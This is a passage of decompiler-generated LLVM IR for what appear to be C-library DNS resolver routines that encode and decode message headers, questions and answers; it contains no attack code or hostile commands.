  uselistorder label %dec_label_pc_8055fc0, { 1, 0 }
  uselistorder label %dec_label_pc_8055fb5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055fa8, { 1, 0 }
  uselistorder label %dec_label_pc_8055fa4, { 1, 0 }
  uselistorder label %dec_label_pc_8055f90, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055f8d, { 1, 0 }
  uselistorder label %dec_label_pc_8055f63, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80560b5 = load i32, i32* @ebx, align 4
  store i32 %v0_80560b5, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_80560bd = ptrtoint i8* %tmp8 to i32
  store i32 %v4_80560bd, i32* %esi.global-to-local, align 4
  %v7_80560c6 = icmp sgt i32 %tmp, 11
  br i1 %v7_80560c6, label %dec_label_pc_80560cc, label %dec_label_pc_8056162

dec_label_pc_80560cc:                             ; preds = %entry
  %v1_80560cc = add i32 %tmp9, 1
  %v2_80560cc = inttoptr i32 %v1_80560cc to i8*
  %v3_80560cc = load i8, i8* %v2_80560cc, align 1
  store i8 %v3_80560cc, i8* %tmp8, align 1
  %v0_80560d2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80560d2 = inttoptr i32 %v0_80560d2 to i32*
  %v2_80560d2 = load i32, i32* %v1_80560d2, align 4
  %v1_80560d4 = trunc i32 %v2_80560d2 to i8
  %v2_80560d4 = load i32, i32* %esi.global-to-local, align 4
  %v3_80560d4 = add i32 %v2_80560d4, 1
  %v4_80560d4 = inttoptr i32 %v3_80560d4 to i8*
  store i8 %v1_80560d4, i8* %v4_80560d4, align 1
  %v0_80560fa = load i32, i32* %ebx.global-to-local, align 4
  %v1_80560fa = add i32 %v0_80560fa, 8
  %v2_80560fa = inttoptr i32 %v1_80560fa to i32*
  %v3_80560fa = load i32, i32* %v2_80560fa, align 4
  %v1_80560fd = mul i32 %v3_80560fa, 8
  %v2_8056103 = or i32 %v1_80560fd, 4
  %v1_8056105 = add i32 %v0_80560fa, 20
  %v2_8056105 = inttoptr i32 %v1_8056105 to i32*
  %v3_8056105 = load i32, i32* %v2_8056105, align 4
  %v4_8056105 = icmp eq i32 %v3_8056105, 0
  %v1_8056109 = icmp eq i1 %v4_8056105, false
  %v2_8056109 = zext i1 %v1_8056109 to i32
  %v2_805610c = or i32 %v2_8056109, %v2_8056103
  %v2_805610e = or i32 %v2_805610c, -126
  %v5_805610e = trunc i32 %v2_805610e to i8
  store i32 %v2_805610e, i32* @ecx, align 4
  %v2_8056110 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056110 = add i32 %v2_8056110, 2
  %v4_8056110 = inttoptr i32 %v3_8056110 to i8*
  store i8 %v5_805610e, i8* %v4_8056110, align 1
  %v0_8056113 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056119 = add i32 %v0_8056113, 28
  %v2_8056119 = inttoptr i32 %v1_8056119 to i8*
  %v3_8056119 = load i8, i8* %v2_8056119, align 1
  %tmp13 = urem i8 %v3_8056119, 16
  %v2_8056124 = or i8 %tmp13, -128
  %v2_8056126 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056126 = add i32 %v2_8056126, 3
  %v4_8056126 = inttoptr i32 %v3_8056126 to i8*
  store i8 %v2_8056124, i8* %v4_8056126, align 1
  %v0_8056129 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056129 = add i32 %v0_8056129, 33
  %v2_8056129 = inttoptr i32 %v1_8056129 to i8*
  %v3_8056129 = load i8, i8* %v2_8056129, align 1
  %v2_805612d = load i32, i32* %esi.global-to-local, align 4
  %v3_805612d = add i32 %v2_805612d, 4
  %v4_805612d = inttoptr i32 %v3_805612d to i8*
  store i8 %v3_8056129, i8* %v4_805612d, align 1
  %v0_8056130 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056130 = add i32 %v0_8056130, 32
  %v2_8056130 = inttoptr i32 %v1_8056130 to i32*
  %v3_8056130 = load i32, i32* %v2_8056130, align 4
  %v1_8056133 = trunc i32 %v3_8056130 to i8
  %v2_8056133 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056133 = add i32 %v2_8056133, 5
  %v4_8056133 = inttoptr i32 %v3_8056133 to i8*
  store i8 %v1_8056133, i8* %v4_8056133, align 1
  %v0_8056136 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056136 = add i32 %v0_8056136, 37
  %v2_8056136 = inttoptr i32 %v1_8056136 to i8*
  %v3_8056136 = load i8, i8* %v2_8056136, align 1
  %v2_805613a = load i32, i32* %esi.global-to-local, align 4
  %v3_805613a = add i32 %v2_805613a, 6
  %v4_805613a = inttoptr i32 %v3_805613a to i8*
  store i8 %v3_8056136, i8* %v4_805613a, align 1
  %v0_805613d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805613d = add i32 %v0_805613d, 36
  %v2_805613d = inttoptr i32 %v1_805613d to i32*
  %v3_805613d = load i32, i32* %v2_805613d, align 4
  %v1_8056140 = trunc i32 %v3_805613d to i8
  %v2_8056140 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056140 = add i32 %v2_8056140, 7
  %v4_8056140 = inttoptr i32 %v3_8056140 to i8*
  store i8 %v1_8056140, i8* %v4_8056140, align 1
  %v0_8056143 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056143 = add i32 %v0_8056143, 41
  %v2_8056143 = inttoptr i32 %v1_8056143 to i8*
  %v3_8056143 = load i8, i8* %v2_8056143, align 1
  %v2_8056147 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056147 = add i32 %v2_8056147, 8
  %v4_8056147 = inttoptr i32 %v3_8056147 to i8*
  store i8 %v3_8056143, i8* %v4_8056147, align 1
  %v0_805614a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805614a = add i32 %v0_805614a, 40
  %v2_805614a = inttoptr i32 %v1_805614a to i32*
  %v3_805614a = load i32, i32* %v2_805614a, align 4
  %v1_805614d = trunc i32 %v3_805614a to i8
  %v2_805614d = load i32, i32* %esi.global-to-local, align 4
  %v3_805614d = add i32 %v2_805614d, 9
  %v4_805614d = inttoptr i32 %v3_805614d to i8*
  store i8 %v1_805614d, i8* %v4_805614d, align 1
  %v0_8056150 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056150 = add i32 %v0_8056150, 45
  %v2_8056150 = inttoptr i32 %v1_8056150 to i8*
  %v3_8056150 = load i8, i8* %v2_8056150, align 1
  %v2_8056154 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056154 = add i32 %v2_8056154, 10
  %v4_8056154 = inttoptr i32 %v3_8056154 to i8*
  store i8 %v3_8056150, i8* %v4_8056154, align 1
  %v0_8056157 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056157 = add i32 %v0_8056157, 44
  %v2_8056157 = inttoptr i32 %v1_8056157 to i32*
  %v3_8056157 = load i32, i32* %v2_8056157, align 4
  %v1_805615a = trunc i32 %v3_8056157 to i8
  %v2_805615a = load i32, i32* %esi.global-to-local, align 4
  %v3_805615a = add i32 %v2_805615a, 11
  %v4_805615a = inttoptr i32 %v3_805615a to i8*
  store i8 %v1_805615a, i8* %v4_805615a, align 1
  %v2_8056162.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8056162

dec_label_pc_8056162:                             ; preds = %entry, %dec_label_pc_80560cc
  %v2_8056162 = phi i32 [ %v0_80560b5, %entry ], [ %v2_8056162.pre, %dec_label_pc_80560cc ]
  %v0_8056164 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80560cc ]
  store i32 %v2_8056162, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056164

; uselistorder directives
  uselistorder i32 45, { 6, 2, 5, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 4, 2, 0, 3, 1 }
  uselistorder i32 33, { 5, 3, 4, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056162, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056168 = load i32, i32* @ebx, align 4
  store i32 %v0_8056168, i32* %stack_var_-4, align 4
  %v4_8056169 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8056169, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8056171 = load i8, i8* %tmp2, align 1
  %v3_8056171 = zext i8 %v2_8056171 to i32
  %v1_8056174 = add i32 %v4_8056169, 1
  %v2_8056174 = inttoptr i32 %v1_8056174 to i8*
  %v3_8056174 = load i8, i8* %v2_8056174, align 1
  %v4_8056174 = zext i8 %v3_8056174 to i32
  %v2_8056178 = mul nuw nsw i32 %v3_8056171, 256
  %v2_805617b = or i32 %v4_8056174, %v2_8056178
  %v2_805617d = inttoptr i32 %tmp to i32*
  store i32 %v2_805617b, i32* %v2_805617d, align 4
  %v0_805617f = load i32, i32* @ecx, align 4
  %v1_805617f = add i32 %v0_805617f, 2
  %v2_805617f = inttoptr i32 %v1_805617f to i8*
  %v3_805617f = load i8, i8* %v2_805617f, align 1
  %tmp6 = icmp slt i8 %v3_805617f, 0
  %v2_8056183 = zext i1 %tmp6 to i32
  %v1_8056186 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056186 = add i32 %v1_8056186, 4
  %v3_8056186 = inttoptr i32 %v2_8056186 to i32*
  store i32 %v2_8056183, i32* %v3_8056186, align 4
  %v0_8056189 = load i32, i32* @ecx, align 4
  %v1_8056189 = add i32 %v0_8056189, 2
  %v2_8056189 = inttoptr i32 %v1_8056189 to i8*
  %v3_8056189 = load i8, i8* %v2_8056189, align 1
  %v3_805618c = udiv i8 %v3_8056189, 8
  %tmp7 = urem i8 %v3_805618c, 16
  %v1_805618f = zext i8 %tmp7 to i32
  %v1_8056192 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056192 = add i32 %v1_8056192, 8
  %v3_8056192 = inttoptr i32 %v2_8056192 to i32*
  store i32 %v1_805618f, i32* %v3_8056192, align 4
  %v0_8056195 = load i32, i32* @ecx, align 4
  %v1_8056195 = add i32 %v0_8056195, 2
  %v2_8056195 = inttoptr i32 %v1_8056195 to i8*
  %v3_8056195 = load i8, i8* %v2_8056195, align 1
  %div = udiv i8 %v3_8056195, 4
  %tmp8 = urem i8 %div, 2
  %v1_805619c = zext i8 %tmp8 to i32
  %v1_805619f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805619f = add i32 %v1_805619f, 12
  %v3_805619f = inttoptr i32 %v2_805619f to i32*
  store i32 %v1_805619c, i32* %v3_805619f, align 4
  %v0_80561a2 = load i32, i32* @ecx, align 4
  %v1_80561a2 = add i32 %v0_80561a2, 2
  %v2_80561a2 = inttoptr i32 %v1_80561a2 to i8*
  %v3_80561a2 = load i8, i8* %v2_80561a2, align 1
  %div5 = udiv i8 %v3_80561a2, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80561a8 = zext i8 %tmp9 to i32
  %v1_80561ab = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561ab = add i32 %v1_80561ab, 16
  %v3_80561ab = inttoptr i32 %v2_80561ab to i32*
  store i32 %v1_80561a8, i32* %v3_80561ab, align 4
  %v0_80561ae = load i32, i32* @ecx, align 4
  %v1_80561ae = add i32 %v0_80561ae, 2
  %v2_80561ae = inttoptr i32 %v1_80561ae to i8*
  %v3_80561ae = load i8, i8* %v2_80561ae, align 1
  %tmp10 = urem i8 %v3_80561ae, 2
  %v1_80561b2 = zext i8 %tmp10 to i32
  %v1_80561b5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561b5 = add i32 %v1_80561b5, 20
  %v3_80561b5 = inttoptr i32 %v2_80561b5 to i32*
  store i32 %v1_80561b2, i32* %v3_80561b5, align 4
  %v0_80561b8 = load i32, i32* @ecx, align 4
  %v1_80561b8 = add i32 %v0_80561b8, 3
  %v2_80561b8 = inttoptr i32 %v1_80561b8 to i8*
  %v3_80561b8 = load i8, i8* %v2_80561b8, align 1
  %tmp11 = icmp slt i8 %v3_80561b8, 0
  %v2_80561bc = zext i1 %tmp11 to i32
  %v1_80561bf = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561bf = add i32 %v1_80561bf, 24
  %v3_80561bf = inttoptr i32 %v2_80561bf to i32*
  store i32 %v2_80561bc, i32* %v3_80561bf, align 4
  %v0_80561c2 = load i32, i32* @ecx, align 4
  %v1_80561c2 = add i32 %v0_80561c2, 3
  %v2_80561c2 = inttoptr i32 %v1_80561c2 to i8*
  %v3_80561c2 = load i8, i8* %v2_80561c2, align 1
  %tmp12 = urem i8 %v3_80561c2, 16
  %v1_80561c6 = zext i8 %tmp12 to i32
  %v1_80561c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561c9 = add i32 %v1_80561c9, 28
  %v3_80561c9 = inttoptr i32 %v2_80561c9 to i32*
  store i32 %v1_80561c6, i32* %v3_80561c9, align 4
  %v0_80561cc = load i32, i32* @ecx, align 4
  %v1_80561cc = add i32 %v0_80561cc, 4
  %v2_80561cc = inttoptr i32 %v1_80561cc to i8*
  %v3_80561cc = load i8, i8* %v2_80561cc, align 1
  %v4_80561cc = zext i8 %v3_80561cc to i32
  %v1_80561d0 = add i32 %v0_80561cc, 5
  %v2_80561d0 = inttoptr i32 %v1_80561d0 to i8*
  %v3_80561d0 = load i8, i8* %v2_80561d0, align 1
  %v4_80561d0 = zext i8 %v3_80561d0 to i32
  %v2_80561d4 = mul nuw nsw i32 %v4_80561cc, 256
  %v2_80561d7 = or i32 %v4_80561d0, %v2_80561d4
  %v1_80561d9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561d9 = add i32 %v1_80561d9, 32
  %v3_80561d9 = inttoptr i32 %v2_80561d9 to i32*
  store i32 %v2_80561d7, i32* %v3_80561d9, align 4
  %v0_80561dc = load i32, i32* @ecx, align 4
  %v1_80561dc = add i32 %v0_80561dc, 6
  %v2_80561dc = inttoptr i32 %v1_80561dc to i8*
  %v3_80561dc = load i8, i8* %v2_80561dc, align 1
  %v4_80561dc = zext i8 %v3_80561dc to i32
  %v1_80561e0 = add i32 %v0_80561dc, 7
  %v2_80561e0 = inttoptr i32 %v1_80561e0 to i8*
  %v3_80561e0 = load i8, i8* %v2_80561e0, align 1
  %v4_80561e0 = zext i8 %v3_80561e0 to i32
  %v2_80561e4 = mul nuw nsw i32 %v4_80561dc, 256
  %v2_80561e7 = or i32 %v4_80561e0, %v2_80561e4
  %v1_80561e9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561e9 = add i32 %v1_80561e9, 36
  %v3_80561e9 = inttoptr i32 %v2_80561e9 to i32*
  store i32 %v2_80561e7, i32* %v3_80561e9, align 4
  %v0_80561ec = load i32, i32* @ecx, align 4
  %v1_80561ec = add i32 %v0_80561ec, 8
  %v2_80561ec = inttoptr i32 %v1_80561ec to i8*
  %v3_80561ec = load i8, i8* %v2_80561ec, align 1
  %v4_80561ec = zext i8 %v3_80561ec to i32
  %v1_80561f0 = add i32 %v0_80561ec, 9
  %v2_80561f0 = inttoptr i32 %v1_80561f0 to i8*
  %v3_80561f0 = load i8, i8* %v2_80561f0, align 1
  %v4_80561f0 = zext i8 %v3_80561f0 to i32
  %v2_80561f4 = mul nuw nsw i32 %v4_80561ec, 256
  %v2_80561f7 = or i32 %v4_80561f0, %v2_80561f4
  %v1_80561f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561f9 = add i32 %v1_80561f9, 40
  %v3_80561f9 = inttoptr i32 %v2_80561f9 to i32*
  store i32 %v2_80561f7, i32* %v3_80561f9, align 4
  %v0_80561fc = load i32, i32* @ecx, align 4
  %v1_80561fc = add i32 %v0_80561fc, 10
  %v2_80561fc = inttoptr i32 %v1_80561fc to i8*
  %v3_80561fc = load i8, i8* %v2_80561fc, align 1
  %v4_80561fc = zext i8 %v3_80561fc to i32
  %v1_8056200 = add i32 %v0_80561fc, 11
  %v2_8056200 = inttoptr i32 %v1_8056200 to i8*
  %v3_8056200 = load i8, i8* %v2_8056200, align 1
  %v4_8056200 = zext i8 %v3_8056200 to i32
  %v2_8056204 = mul nuw nsw i32 %v4_80561fc, 256
  %v2_8056207 = or i32 %v4_8056200, %v2_8056204
  %v1_8056209 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056209 = add i32 %v1_8056209, 44
  %v3_8056209 = inttoptr i32 %v2_8056209 to i32*
  store i32 %v2_8056207, i32* %v3_8056209, align 4
  %v2_8056211 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056211, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 11, 12, 4, 5, 7, 8, 13, 6, 2, 9, 10, 0, 1, 3 }
  uselistorder i32 40, { 9, 10, 3, 12, 13, 14, 11, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 7, { 22, 23, 4, 10, 5, 0, 3, 11, 18, 19, 20, 21, 6, 1, 17, 7, 8, 9, 12, 13, 14, 15, 16, 2 }
  uselistorder i32 6, { 28, 29, 2, 3, 23, 24, 0, 7, 21, 15, 16, 9, 31, 17, 25, 26, 4, 1, 5, 8, 13, 14, 18, 19, 20, 27, 10, 22, 11, 12, 30, 6 }
  uselistorder i32 28, { 35, 36, 18, 19, 37, 25, 49, 48, 41, 42, 2, 43, 44, 45, 46, 47, 4, 5, 6, 0, 26, 17, 20, 21, 38, 39, 27, 28, 29, 30, 31, 32, 1, 33, 50, 40, 22, 23, 24, 7, 8, 34, 13, 12, 10, 11, 14, 15, 9, 16, 3 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 16, 5, 13, 21, 17, 6, 18, 7, 8, 9, 10, 11, 19, 20, 12, 14, 15 }
  uselistorder i8 4, { 0, 3, 1, 4, 5, 2 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i8 8, { 0, 7, 2, 6, 3, 1, 4, 5 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8056214 = load i32, i32* @edi, align 4
  %v0_8056215 = load i32, i32* @esi, align 4
  %v0_8056216 = load i32, i32* @ebx, align 4
  store i32 %v0_8056216, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8056223 = load i32, i32* @eax, align 4
  %v1_8056226 = inttoptr i32 %tmp3 to i32*
  %v2_8056226 = load i32, i32* %v1_8056226, align 4
  %v7_8056228 = inttoptr i32 %v2_8056226 to i8*
  %v8_8056228 = call i32 @__encode_dotted(i8* %v7_8056228, i32 %tmp2, i32 %tmp, i32 %v0_8056223, i32 %v0_8056216, i32 %v0_8056215, i32 %v0_8056214)
  store i32 %v8_8056228, i32* @ecx, align 4
  %v2_8056232 = icmp slt i32 %v8_8056228, 0
  br i1 %v2_8056232, label %dec_label_pc_8056261, label %dec_label_pc_8056236

dec_label_pc_8056236:                             ; preds = %entry
  %v0_8056236 = load i32, i32* @ebx, align 4
  %v2_8056236 = sub i32 %v0_8056236, %v8_8056228
  %v1_8056238 = add i32 %v2_8056236, -3
  %v6_8056238 = sub i32 2, %v2_8056236
  %v7_8056238 = and i32 %v6_8056238, %v2_8056236
  %v8_8056238 = icmp slt i32 %v7_8056238, 0
  %v9_8056238 = icmp eq i32 %v1_8056238, 0
  %v10_8056238 = icmp slt i32 %v1_8056238, 0
  %v3_805623b = icmp eq i1 %v10_8056238, %v8_8056238
  %v4_805623b = icmp eq i1 %v9_8056238, false
  %v5_805623b = and i1 %v4_805623b, %v3_805623b
  br i1 %v5_805623b, label %dec_label_pc_8056242, label %dec_label_pc_805623d

dec_label_pc_805623d:                             ; preds = %dec_label_pc_8056236
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8056261

dec_label_pc_8056242:                             ; preds = %dec_label_pc_8056236
  %v0_8056242 = load i32, i32* @edi, align 4
  %v2_8056242 = add i32 %v0_8056242, %v8_8056228
  store i32 %v2_8056242, i32* @edx, align 4
  %v1_8056245 = add i32 %v8_8056228, 4
  store i32 %v1_8056245, i32* @ecx, align 4
  %v0_8056248 = load i32, i32* @esi, align 4
  %v1_8056248 = add i32 %v0_8056248, 5
  %v2_8056248 = inttoptr i32 %v1_8056248 to i8*
  %v3_8056248 = load i8, i8* %v2_8056248, align 1
  %v3_805624c = inttoptr i32 %v2_8056242 to i8*
  store i8 %v3_8056248, i8* %v3_805624c, align 1
  %v0_805624e = load i32, i32* @esi, align 4
  %v1_805624e = add i32 %v0_805624e, 4
  %v2_805624e = inttoptr i32 %v1_805624e to i32*
  %v3_805624e = load i32, i32* %v2_805624e, align 4
  %v1_8056251 = trunc i32 %v3_805624e to i8
  %v2_8056251 = load i32, i32* @edx, align 4
  %v3_8056251 = add i32 %v2_8056251, 1
  %v4_8056251 = inttoptr i32 %v3_8056251 to i8*
  store i8 %v1_8056251, i8* %v4_8056251, align 1
  %v0_8056254 = load i32, i32* @esi, align 4
  %v1_8056254 = add i32 %v0_8056254, 9
  %v2_8056254 = inttoptr i32 %v1_8056254 to i8*
  %v3_8056254 = load i8, i8* %v2_8056254, align 1
  %v2_8056258 = load i32, i32* @edx, align 4
  %v3_8056258 = add i32 %v2_8056258, 2
  %v4_8056258 = inttoptr i32 %v3_8056258 to i8*
  store i8 %v3_8056254, i8* %v4_8056258, align 1
  %v0_805625b = load i32, i32* @esi, align 4
  %v1_805625b = add i32 %v0_805625b, 8
  %v2_805625b = inttoptr i32 %v1_805625b to i32*
  %v3_805625b = load i32, i32* %v2_805625b, align 4
  %v1_805625e = trunc i32 %v3_805625b to i8
  %v2_805625e = load i32, i32* @edx, align 4
  %v3_805625e = add i32 %v2_805625e, 3
  %v4_805625e = inttoptr i32 %v3_805625e to i8*
  store i8 %v1_805625e, i8* %v4_805625e, align 1
  %v0_8056261.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056261

dec_label_pc_8056261:                             ; preds = %entry, %dec_label_pc_805623d, %dec_label_pc_8056242
  %v0_8056261 = phi i32 [ %v8_8056228, %entry ], [ -1, %dec_label_pc_805623d ], [ %v0_8056261.pre, %dec_label_pc_8056242 ]
  %v2_8056263 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056263, i32* @ebx, align 4
  store i32 %v0_8056214, i32* @edi, align 4
  ret i32 %v0_8056261

; uselistorder directives
  uselistorder i32 %v1_8056238, { 1, 0 }
  uselistorder i32 %v2_8056236, { 0, 2, 1 }
  uselistorder i32 %v8_8056228, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 0, 5 }
  uselistorder label %dec_label_pc_8056261, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8056273 = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_805627b = icmp slt i32 %v2_8056273, 0
  br i1 %v2_805627b, label %dec_label_pc_8056282, label %dec_label_pc_805627f

dec_label_pc_805627f:                             ; preds = %entry
  %v1_805627f = add i32 %v2_8056273, 4
  br label %dec_label_pc_8056282

dec_label_pc_8056282:                             ; preds = %entry, %dec_label_pc_805627f
  %v0_8056285 = phi i32 [ %v2_8056273, %entry ], [ %v1_805627f, %dec_label_pc_805627f ]
  ret i32 %v0_8056285

; uselistorder directives
  uselistorder label %dec_label_pc_8056282, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056288 = load i32, i32* @ebp, align 4
  %v0_8056289 = load i32, i32* @edi, align 4
  %v0_805628a = load i32, i32* @esi, align 4
  %v0_805628b = load i32, i32* @ebx, align 4
  store i32 %v0_805628b, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80562ac = ptrtoint i32* %stack_var_-272 to i32
  %v4_80562b9 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80562ac, i32 256)
  store i32 %v4_80562b9, i32* @edi, align 4
  %v3_80562c3 = icmp slt i32 %v4_80562b9, 0
  br i1 %v3_80562c3, label %dec_label_pc_8056374, label %dec_label_pc_80562cb

dec_label_pc_80562cb:                             ; preds = %entry
  %v0_80562cb = load i32, i32* @ebx, align 4
  %v3_80562cb = add i32 %v0_80562cb, %v4_80562b9
  %v0_80562cd = load i32, i32* @esi, align 4
  %v2_80562cd = sub i32 %v0_80562cd, %v3_80562cb
  %v1_80562d3 = add i32 %v2_80562cd, -10
  %v10_80562d3 = icmp slt i32 %v1_80562d3, 0
  store i32 %v1_80562d3, i32* @esi, align 4
  %v1_80562da = icmp eq i1 %v10_80562d3, false
  br i1 %v1_80562da, label %dec_label_pc_80562e3, label %dec_label_pc_80562dc

dec_label_pc_80562dc:                             ; preds = %dec_label_pc_80562cb
  br label %dec_label_pc_8056374

dec_label_pc_80562e3:                             ; preds = %dec_label_pc_80562cb
  %v6_80562ea = add i32 %v3_80562cb, %tmp4
  store i32 %v6_80562ea, i32* @ebx, align 4
  %v1_80562f6 = bitcast i32* %stack_var_-272 to i8*
  %v2_80562f6 = call i32 @__GI_strdup(i8* %v1_80562f6)
  %v1_80562fb = load i32, i32* @ebp, align 4
  %v2_80562fb = inttoptr i32 %v1_80562fb to i32*
  store i32 %v2_80562f6, i32* %v2_80562fb, align 4
  %v0_80562fe = load i32, i32* @ebx, align 4
  %v1_80562fe = add i32 %v0_80562fe, 4
  store i32 %v1_80562fe, i32* %esi.global-to-local, align 4
  %v1_8056301 = inttoptr i32 %v0_80562fe to i8*
  %v2_8056301 = load i8, i8* %v1_8056301, align 1
  %v3_8056301 = zext i8 %v2_8056301 to i32
  %v1_8056304 = add i32 %v0_80562fe, 1
  %v2_8056304 = inttoptr i32 %v1_8056304 to i8*
  %v3_8056304 = load i8, i8* %v2_8056304, align 1
  %v4_8056304 = zext i8 %v3_8056304 to i32
  %v2_8056308 = mul nuw nsw i32 %v3_8056301, 256
  %v2_805630b = or i32 %v4_8056304, %v2_8056308
  %v1_805630d = load i32, i32* @ebp, align 4
  %v2_805630d = add i32 %v1_805630d, 4
  %v3_805630d = inttoptr i32 %v2_805630d to i32*
  store i32 %v2_805630b, i32* %v3_805630d, align 4
  %v0_8056310 = load i32, i32* @ebx, align 4
  %v1_8056310 = add i32 %v0_8056310, 2
  %v2_8056310 = inttoptr i32 %v1_8056310 to i8*
  %v3_8056310 = load i8, i8* %v2_8056310, align 1
  %v4_8056310 = zext i8 %v3_8056310 to i32
  %v1_8056314 = add i32 %v0_8056310, 3
  %v2_8056314 = inttoptr i32 %v1_8056314 to i8*
  %v3_8056314 = load i8, i8* %v2_8056314, align 1
  %v4_8056314 = zext i8 %v3_8056314 to i32
  %v2_8056318 = mul nuw nsw i32 %v4_8056310, 256
  %v2_805631b = or i32 %v4_8056314, %v2_8056318
  %v1_805631d = load i32, i32* @ebp, align 4
  %v2_805631d = add i32 %v1_805631d, 8
  %v3_805631d = inttoptr i32 %v2_805631d to i32*
  store i32 %v2_805631b, i32* %v3_805631d, align 4
  %v0_8056320 = load i32, i32* @ebx, align 4
  %v1_8056320 = add i32 %v0_8056320, 4
  %v2_8056320 = inttoptr i32 %v1_8056320 to i8*
  %v3_8056320 = load i8, i8* %v2_8056320, align 1
  %v4_8056320 = zext i8 %v3_8056320 to i32
  %v0_8056324 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056324 = add i32 %v0_8056324, 1
  %v2_8056324 = inttoptr i32 %v1_8056324 to i8*
  %v3_8056324 = load i8, i8* %v2_8056324, align 1
  %v4_8056324 = zext i8 %v3_8056324 to i32
  %v2_8056328 = mul nuw i32 %v4_8056320, 16777216
  %v2_805632b = mul nuw nsw i32 %v4_8056324, 65536
  %v1_805632e = add i32 %v0_8056324, 2
  %v2_805632e = inttoptr i32 %v1_805632e to i8*
  %v3_805632e = load i8, i8* %v2_805632e, align 1
  %v4_805632e = zext i8 %v3_805632e to i32
  %v2_8056332 = mul nuw nsw i32 %v4_805632e, 256
  %v2_8056335 = or i32 %v2_805632b, %v2_8056328
  %v1_8056337 = add i32 %v0_8056324, 3
  %v2_8056337 = inttoptr i32 %v1_8056337 to i8*
  %v3_8056337 = load i8, i8* %v2_8056337, align 1
  %v4_8056337 = zext i8 %v3_8056337 to i32
  %v2_805633b = or i32 %v4_8056337, %v2_8056335
  %v2_805633d = or i32 %v2_805633b, %v2_8056332
  store i32 %v2_805633d, i32* @ecx, align 4
  %v1_805633f = load i32, i32* @ebp, align 4
  %v2_805633f = add i32 %v1_805633f, 12
  %v3_805633f = inttoptr i32 %v2_805633f to i32*
  store i32 %v2_805633d, i32* %v3_805633f, align 4
  %v0_8056342 = load i32, i32* @ebx, align 4
